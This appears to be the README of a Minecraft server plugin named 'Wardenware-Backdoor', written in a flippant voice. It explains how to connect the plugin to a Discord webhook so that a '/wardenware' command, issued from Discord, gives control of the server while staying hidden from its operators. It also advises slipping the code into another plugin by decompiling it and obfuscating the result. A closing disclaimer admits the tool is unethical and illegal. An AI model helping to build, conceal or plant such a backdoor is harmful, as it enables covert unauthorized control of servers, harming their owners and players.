# Wardenware-Backdoor
haha bukkit, spigot and discord api go brrrrr
# CONFIG
So this may be confusing but go to your discord channel and create a webhook, copy that webhook URL and and put it in " "YOUR DISCORD WEBHOOK URL HERE" ".
Then the command is /wardenware and execute that in the DISCORD CHANNEL. It refuses to send a command on minecraft to prevent awareness of the backdoor.

Also don't come crying to me and crap when the plugin doesn't work, because I won't be updating this for long.

You can either decompile your plugin you want to add it in, otherwise just compile the one file into a .jar it will still work. Just make sure its obfuscated...

NOTE:

This is a plugin that enables unauthorized access to a Minecraft server is unethical and goes against the terms of service of Minecraft and Spigot. It is also illegal and can result in severe consequences.
So I AM NOT RESPONISBLE FOR ANY DAMAGE DONE!!!
